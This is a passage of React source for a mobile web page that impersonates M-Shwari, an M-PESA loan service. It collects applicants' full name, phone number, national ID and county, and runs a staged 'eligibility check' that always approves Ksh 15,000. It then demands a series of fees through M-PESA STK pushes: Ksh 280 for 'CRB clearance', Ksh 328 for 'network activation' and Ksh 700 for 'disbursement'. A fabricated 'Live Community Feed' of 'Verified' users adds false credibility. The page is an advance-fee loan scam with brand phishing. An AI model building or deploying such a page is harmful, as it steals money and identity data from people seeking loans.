            <img className="r" style={{ left: '14.113%', width: '18.548%' }} src={IMG_R} alt="" />
          </div>
          <div className="rule"></div>
          <p className="motto">
            <span>Save smart.</span><span>Spend wiser.</span><span className="hl">Live better!</span>
          </p>
        </div>
      </section>

      {/* FORMS AREA */}
      <div style={{ display: view !== 'splash' ? 'block' : 'none' }}>
        
        {/* STEP 1 */}
        <section className={`view ${view === 'step1' ? 'active' : ''}`}>
          <h1>Complete your application</h1>
          <p className="sub">Fields marked <strong style={{ color: 'var(--red)' }}>*</strong> are required. Applicants must be 18 years or older.</p>
          <form onSubmit={handleSubmitApplication} noValidate>
            
            <div className={`field ${errors.fullName ? 'bad' : formData.fullName ? 'ok' : ''}`}>
              <label>Full Name *</label>
              <input type="text" id="fullName" placeholder="Enter full name" value={formData.fullName} onChange={handleInputChange} required />
              <div className="err">Name must contain letters only.</div>
            </div>

            <div className="row2">
              <div className={`field ${errors.phone ? 'bad' : formData.phone ? 'ok' : ''}`}>
                <label>Phone Number *</label>
                <input type="tel" id="phone" placeholder="0712345678" value={formData.phone} onChange={handleInputChange} required />
              </div>
              <div className={`field ${errors.id ? 'bad' : formData.id ? 'ok' : ''}`}>
                <label>National ID *</label>
                <input type="text" id="id" placeholder="12345678" value={formData.id} onChange={handleInputChange} required />
              </div>
            </div>

            <div className="row2">
              <div className={`field ${errors.age ? 'bad' : formData.age ? 'ok' : ''}`}>
                <label>Age (18+) *</label>
                <input type="number" id="age" placeholder="25" value={formData.age} onChange={handleInputChange} required />
              </div>
              <div className={`field ${errors.occupation ? 'bad' : formData.occupation ? 'ok' : ''}`}>
                <label>Occupation *</label>
                <input type="text" id="occupation" placeholder="Farmer, Student" value={formData.occupation} onChange={handleInputChange} required />
              </div>
            </div>

            <div className="row2">
              <div className={`field ${errors.county ? 'bad' : formData.county ? 'ok' : ''}`}>
                <label>County *</label>
                <select id="county" value={formData.county} onChange={handleInputChange} required>
                  <option value="">Select County</option>
                  {COUNTIES.map(c => <option key={c} value={c}>{c}</option>)}
                </select>
                <div className="err">Please select your county.</div>
              </div>
              <div className="field">
                <label>Email (optional)</label>
                <input type="email" id="email" placeholder="name@example.com" value={formData.email} onChange={handleInputChange} />
              </div>
            </div>

            <div className="kin-box">
              <div className="kin-title">Next of Kin — Optional</div>
              <div className="row2" style={{ marginBottom: 0 }}>
                <div className="field" style={{ marginBottom: 0 }}>
                  <input type="text" id="nextKinName" placeholder="Kin Name" value={formData.nextKinName} onChange={handleInputChange} />
                </div>
                <div className="field" style={{ marginBottom: 0 }}>
                  <input type="tel" id="nextKinPhone" placeholder="Kin Phone" value={formData.nextKinPhone} onChange={handleInputChange} />
                </div>
              </div>
            </div>

            <div className={`field ${errors.hearAbout ? 'bad' : 'ok'}`} onClick={() => setShowHearAboutSheet(true)}>
              <label>Where did you hear about M-Shwari? *</label>
              <div className="fake-select">{formData.hearAbout}</div>
              <span className="chevron"></span>
              <div className="err">Please select how you heard about M-Shwari.</div>
            </div>

            <button type="submit" className="btn">Submit Application</button>
          </form>
          <div className="badge-card">M-SHWARI · APPROVED</div>
        </section>

        {/* STEP 2 */}
        <section className={`view ${view === 'step2' ? 'active' : ''}`}>
          <button onClick={() => setView('step1')} style={{ alignSelf: 'flex-start', background: 'none', border: 0, color: 'var(--mute)', fontSize: 13, fontWeight: 600, cursor: 'pointer', padding: 0, marginBottom: 12 }}>← Back</button>
          <h1><strong>{formData.fullName.split(' ')[0]}</strong>, what will you use your M-Shwari funds for?</h1>
          <p className="sub">Select the main purpose below to continue your application.</p>

          <div className="purpose-list">
            {['Start a business', 'Top up a business', 'Pay school fees', 'Pay bills', 'Pay rent'].map((p, i) => (
              <div key={p} className={`purpose-item ${formData.purpose === p ? 'selected' : ''}`} onClick={() => { setFormData({...formData, purpose: p}); setErrors({...errors, purpose: false}); }}>
                <div className="num-box">{i + 1}</div>
                <div className="purpose-text">{p}</div>
                <div className="purpose-radio"></div>
              </div>
            ))}
          </div>
          {errors.purpose && <div className="err" style={{ display: 'block', marginBottom: 12 }}>Please select a purpose to continue.</div>}

          <div className="info-note">Kindly use your M-Shwari funds wisely and responsibly.</div>
          <button className="btn" onClick={handleSubmitPurpose}>Continue →</button>
          <div className="badge-card">M-SHWARI · APPROVED</div>
        </section>

        {/* CHECKING */}
        <section className={`view ${view === 'checkingPage' ? 'active' : ''}`}>
          <div style={{ textAlign: 'center', paddingTop: 40 }}>
            <div className="sp big" style={{ margin: '0 auto 20px' }}></div>
            <h1 style={{ fontSize: 20, margin: '0 0 6px' }}>Checking your eligibility...</h1>
            <p className="sub" style={{ marginBottom: 26 }}>Hold on {formData.fullName.split(' ')[0] || 'candidate'}, we're reviewing your application.</p>
          </div>
          {[
            'Verifying national ID...', 'Checking phone number registration...', 'Reviewing county records...', 'Confirming age eligibility...', 'Scoring M-Shwari tier...'
          ].map((text, i) => {
            const step = i + 1;
            let cls = 'check-item pending';
            if (checkProgress === step) cls = 'check-item active';
            else if (checkProgress > step) cls = 'check-item completed';
            
            return (
              <div key={step} className={cls}>
                <div className="check-circle"></div>
                <div>{text}</div>
              </div>
            );
          })}
        </section>

        {/* STEP 3 */}
        <section className={`view ${view === 'step3' ? 'active' : ''}`}>
          <h1>Congratulations, {formData.fullName.split(' ')[0]}!</h1>
          <p className="sub">Based on our eligibility scan, you've been approved for the following M-Shwari limit.</p>

          <div className="amount-block">
            <div className="label">Your Approved M-Shwari Limit</div>
            <div className="value">Ksh 15,000</div>
            <div className="stamp">Eligibility verified · Ready for withdrawal</div>
          </div>

          <div className="info-note">M-Shwari · Instant Mobile Loans · Powered by M-PESA</div>
          <button className="btn dark" onClick={() => setView('crbPage')}>Withdraw Funds</button>
          <p style={{ textAlign: 'center', fontSize: 12, color: 'var(--deep)', fontWeight: 600, marginTop: 10 }}>Funds arrive in under 3 minutes after clearance</p>

          <h2 style={{ fontSize: 15, fontWeight: 600, margin: '26px 0 4px' }}>Live Community Feed <span className="feed-live">LIVE</span></h2>
          <div className="feed-container">
            {feedItems.map((item, idx) => (
              <div className="feed-item" key={idx}>
                <div className="feed-avatar" style={{ background: item.color }}>{item.initials}</div>
                <div style={{ flex: 1, minWidth: 0 }}>
                  <div className="feed-name">{item.name} <span className="verified">Verified</span></div>
                  <div className="feed-text">{item.text}</div>
                  <div className="feed-time">{item.time}</div>
                </div>
              </div>
            ))}
          </div>
          <div className="badge-card">M-SHWARI · APPROVED</div>
        </section>

        {/* CRB PAGE */}
        <section className={`view ${view === 'crbPage' ? 'active' : ''}`}>
          <div className="fee-hero">
            <div className="fee-tag">CRB Clearance Required</div>
            <div className="fee-title">Clear with CRB to release your funds</div>
            <div className="fee-amount">Ksh 280</div>
            <div className="fee-sub">M-PESA STK push to <span>{formData.phone || '0710222875'}</span></div>
          </div>

          <div className="summary-card">
            <div className="summary-title">Payment Summary</div>
            <div className="summary-row"><span className="k">CRB Clearance Fee</span><span className="v hi">Ksh 280</span></div>
            <div className="summary-row"><span className="k">Payment Method</span><span className="v">M-PESA STK</span></div>
            <div className="summary-row"><span className="k">Processing</span><span className="v">Instant</span></div>
          </div>

          <button className="btn red" onClick={() => { setCrbPhone(formData.phone.replace(/^0/, '')); setShowCrbModal(true); }}>Pay Ksh 280 to Clear CRB →</button>
          <p style={{ textAlign: 'center', fontSize: 12, color: 'var(--mute)', marginTop: 10 }}>Secure payment · Funds released immediately after clearance</p>

          <h2 style={{ fontSize: 15, fontWeight: 600, margin: '26px 0 4px' }}>Live Community Feed <span className="feed-live">LIVE</span></h2>
          <div className="feed-container">
            {feedItems.map((item, idx) => (
              <div className="feed-item" key={idx}>
                <div className="feed-avatar" style={{ background: item.color }}>{item.initials}</div>
                <div style={{ flex: 1, minWidth: 0 }}>
                  <div className="feed-name">{item.name} <span className="verified">Verified</span></div>
                  <div className="feed-text">{item.text}</div>
                  <div className="feed-time">{item.time}</div>
                </div>
              </div>
            ))}
          </div>
          <div className="badge-card">M-SHWARI · APPROVED</div>
        </section>

        {/* DISBURSEMENT DETAILS */}
        <section className={`view ${view === 'disbursementDetailsPage' ? 'active' : ''}`}>
          <h1>Where should we send your funds?</h1>
          <p className="sub">Confirm the number and network to receive your M-Shwari funds.</p>

          <div className="field">
            <label>Recipient Full Name</label>
            <div style={{ padding: '8px 0', fontSize: 16, fontWeight: 600, color: 'var(--ink)', borderBottom: '1px solid var(--line)', minHeight: 42, display: 'flex', alignItems: 'center' }}>{formData.fullName || 'BMF SOLUTIONS'}</div>
          </div>

          <div className="field">
            <label>Disbursement Number</label>
            <div className="row2" style={{ marginBottom: 8 }}>
              <button type="button" style={{ flex: 1, padding: 12, border: '1.5px solid var(--green)', background: 'var(--tint)', borderRadius: 10, fontWeight: 600, fontSize: 13, color: 'var(--deep)', cursor: 'pointer', display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 4 }}>
                <span>Same Number</span><span style={{ fontSize: 12, fontWeight: 500, opacity: 0.75 }}>{selectedDisbPhone}</span>
              </button>
              <button type="button" style={{ flex: 1, padding: 12, border: '1.5px solid var(--line)', background: '#fff', borderRadius: 10, fontWeight: 600, fontSize: 13, color: 'var(--mute)', cursor: 'pointer' }}>Different Number</button>
            </div>
            <div style={{ background: 'var(--tint)', border: '1px solid var(--line)', borderRadius: 10, padding: '12px 14px', fontSize: 13, fontWeight: 600, color: 'var(--deep)', display: 'flex', flexWrap: 'wrap', gap: 6, alignItems: 'center' }}>
              <span>{selectedDisbPhone}</span><span style={{ fontSize: 11, color: 'var(--mute)', fontWeight: 500 }}>Funds will be sent here</span>
            </div>
          </div>

          <div className="field">
            <label>Select Network</label>
            <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
              {['safaricom', 'airtel', 'telkom'].map(net => {
                const isSelected = selectedNetwork === net;
                const labels = { safaricom: 'Safaricom (M-PESA)', airtel: 'Airtel Money', telkom: 'Telkom (T-Kash)' };
                const colors = { safaricom: 'var(--deep)', airtel: '#e53935', telkom: '#1565c0' };
                return (
                  <button key={net} type="button" onClick={() => setSelectedNetwork(net)} style={{ width: '100%', padding: 14, border: isSelected ? '1.5px solid var(--green)' : '1.5px solid var(--line)', background: isSelected ? 'var(--tint)' : '#fff', borderRadius: 10, display: 'flex', alignItems: 'center', gap: 12, cursor: 'pointer', textAlign: 'left' }}>
                    <div style={{ width: 18, height: 18, background: colors[net], borderRadius: '50%', flexShrink: 0 }}></div>
                    <div style={{ flex: 1, minWidth: 0 }}>
                      <div style={{ fontWeight: 600, fontSize: 13, color: 'var(--ink)' }}>{labels[net]}</div>
                      <div style={{ fontSize: 11, color: 'var(--mute)' }}>Activation fee: Ksh 328</div>
                    </div>
                    <div style={{ width: 18, height: 18, border: isSelected ? '2px solid var(--green)' : '2px solid var(--line)', borderRadius: '50%', display: 'grid', placeItems: 'center', flexShrink: 0 }}>
                      {isSelected && <span style={{ width: 9, height: 9, background: 'var(--green)', borderRadius: '50%' }}></span>}
                    </div>
                  </button>
                );
              })}
            </div>
          </div>

          <div className="info-note warn">A network activation fee of Ksh 328 is required to enable disbursement to Safaricom (M-PESA).</div>
          <button className="btn dark" onClick={() => setView('networkFeePage')}>Continue — Pay Network Fee →</button>
          <div className="badge-card">M-SHWARI · APPROVED</div>
        </section>

        {/* NETWORK FEE */}
        <section className={`view ${view === 'networkFeePage' ? 'active' : ''}`}>
          <h1>Network Activation Fee</h1>
          <p className="sub">Pay this fee to activate your disbursement channel.</p>

          <div className="summary-card">
            <div className="summary-title">Disbursement Summary</div>
            <div className="summary-row"><span className="k">Fund Amount</span><span className="v hi">Ksh 5,000</span></div>
            <div className="summary-row"><span className="k">Sending To</span><span className="v">{selectedDisbPhone}</span></div>
            <div className="summary-row"><span className="k">Network Fee</span><span className="v hi">Ksh 328</span></div>
          </div>

          <div className="info-note">M-PESA prompt will go to your registered number</div>

          <button className="btn" onClick={processNetworkFeePayment}>
            <span className="t">Pay Ksh 328 — Activate &amp; Receive Funds</span>
          </button>
          <p style={{ textAlign: 'center', fontSize: 11, color: 'var(--mute)', marginTop: 10 }}>Confirmed via official M-PESA callback</p>
          <div className="badge-card">M-SHWARI · APPROVED</div>
        </section>

        {/* DISBURSEMENT FEE */}
        <section className={`view ${view === 'disbursementFeePage' ? 'active' : ''}`}>
          <h1>Disbursement Release Fee</h1>
          <p className="sub">Final step before your funds are released.</p>

          <div className="summary-card">
            <div className="summary-title">Disbursement Summary</div>
            <div className="summary-row"><span className="k">Fund Amount</span><span className="v hi">Ksh 5,000</span></div>
            <div className="summary-row"><span className="k">Sending To</span><span className="v">{selectedDisbPhone}</span></div>
            <div className="summary-row"><span className="k">Network</span><span className="v">Safaricom (M-PESA)</span></div>
            <div className="summary-row"><span className="k">Disbursement Fee</span><span className="v hi">Ksh 700</span></div>
          </div>

          <div className="info-note">Once confirmed, your <strong>Ksh 5,000</strong> will be instantly released to <strong>{selectedDisbPhone}</strong>.</div>

          <button className="btn" onClick={processDisbursementFeePayment}>
            <span className="t">Pay Ksh 700 — Release My Funds</span>
          </button>
          <p style={{ textAlign: 'center', fontSize: 11, color: 'var(--mute)', marginTop: 10 }}>Confirmed via official M-PESA callback</p>
          <div className="badge-card">M-SHWARI · APPROVED</div>
        </section>

      </div>

      {/* BOTTOM SHEET (Hear About) */}
      {showHearAboutSheet && (
        <>
          <div className="sheet-bg show" onClick={() => setShowHearAboutSheet(false)}>
            <div className="sheet show" onClick={e => e.stopPropagation()}>
              {['Social Media', 'WhatsApp', 'Twitter / X', 'Friend / Family', 'Radio / TV', 'Newspaper', 'Other'].map(opt => (
                <div key={opt} className={`sheet-item ${formData.hearAbout === opt ? 'selected' : ''}`} onClick={() => { setFormData({...formData, hearAbout: opt}); setShowHearAboutSheet(false); }}>
                  <span>{opt}</span>
                  <div className="radio-mark"></div>
                </div>
              ))}
            </div>
          </div>
        </>
      )}

      {/* CRB MODAL */}
      {showCrbModal && (
        <div className="modal-bg show">
          <div className="modal-card">
            <h3>CRB Clearance Payment</h3>
            <p>Pay Ksh 280 to clear your CRB and release your M-Shwari funds.</p>
            <div style={{ background: 'var(--tint)', padding: 14, borderRadius: 10, marginBottom: 14 }}>
              <div style={{ fontSize: 11, color: 'var(--deep)', fontWeight: 600, letterSpacing: '0.05em' }}>AMOUNT</div>
              <div style={{ fontSize: 22, fontWeight: 700, color: 'var(--deep)', marginTop: 2 }}>Ksh 280</div>
            </div>
            <div className="phone-input-group">
              <span className="prefix">+254</span>
              <input type="tel" value={crbPhone} onChange={e => setCrbPhone(e.target.value)} placeholder="712345678" />
            </div>
            {crbStatus.msg && <div className={`modal-status show ${crbStatus.type}`}>{crbStatus.msg}</div>}
            <div style={{ display: 'flex', gap: 8, marginTop: 8 }}>
              <button className="btn red" style={{ margin: 0, flex: 1 }} onClick={processCRBPayment}>Pay Ksh 280</button>
              <button className="btn" style={{ margin: 0, background: 'var(--tint)', color: 'var(--deep)', flex: 0.5 }} onClick={() => setShowCrbModal(false)}>Cancel</button>
            </div>
            <p style={{ fontSize: 11, color: 'var(--mute)', marginTop: 12 }}>You will receive an M-Pesa STK push on your phone</p>
          </div>
        </div>
      )}

      {/* STK WAITING OVERLAY */}
      {showStkOverlay && (
        <div className="stk-overlay show">
          <div className="ring"></div>
          <h3>M-PESA Prompt Sent</h3>
          <p>Check <span className="phone">{stkPhoneDisplay}</span> and enter your M-PESA PIN to confirm.</p>
          <div className="listening"><span className="dot"></span> Listening for callback</div>
          <p style={{ fontSize: 11, color: '#9ab0a0' }}>Do not close this page — funds will be processed automatically.</p>
        </div>
      )}

      {/* NETWORK FEE CONFIRMED OVERLAY */}
      {showNetFeeConfirmed && (
        <div className="modal-bg show">
          <div className="modal-card">
            <div className="tick-circle">✓</div>
            <h3>Network Fee Confirmed</h3>
            <p>Payment of <strong>Ksh 328</strong> received via M-PESA.</p>
            <div className="receipt-box">
              <div className="lbl">Receipt</div>
              <div className="val">{netFeeReceipt}</div>
            </div>
            <p>Proceeding to the final disbursement fee...</p>
            <button className="btn dark" onClick={() => { setShowNetFeeConfirmed(false); setView('disbursementFeePage'); }}>Continue → Pay Disbursement Fee</button>
          </div>
        </div>
      )}

      {/* ALL FEES CLEARED OVERLAY */}
      {showAllFeesCleared && (
        <div className="modal-bg show">
          <div className="modal-card">
            <div className="tick-circle">✓</div>
            <h3>All Fees Cleared</h3>
            <p>Disbursement fee of <strong>Ksh 700</strong> confirmed via M-PESA.</p>
            <div className="receipt-box">
              <div className="lbl">Receipt</div>
              <div className="val">{disburseReceipt}</div>
            </div>
            <div className="summary-card" style={{ margin: '0 0 16px', textAlign: 'left' }}>
              <div className="summary-row"><span className="k">Fund Amount</span><span className="v hi">Ksh 5,000</span></div>
              <div className="summary-row"><span className="k">Network</span><span className="v">M-PESA</span></div>
              <div className="summary-row"><span className="k">Sending To</span><span className="v">{selectedDisbPhone}</span></div>
              <div className="summary-row"><span className="k">Fees Paid</span><span className="v hi">Ksh 1,028</span></div>
            </div>
            <p style={{ fontSize: 12, color: 'var(--deep)', fontWeight: 600 }}>Sending funds to your phone...</p>
            <p style={{ fontSize: 11, color: 'var(--mute)' }}>Your funds will arrive within 3 minutes.</p>
            <button className="btn dark" onClick={() => { setShowAllFeesCleared(false); setView('splash'); window.location.reload(); }}>Done</button>
          </div>
        </div>
      )}

      {/* PROCESSING MODAL */}
      {processing && (
        <div className="busy on show">
          <div className="sp big"></div>
          <p>Processing application...</p>
          <div className="bar"><i></i></div>
        </div>
      )}

      {/* TOAST */}
      {toastMsg && <div className="toast show">{toastMsg}</div>}
    </>
  );
}
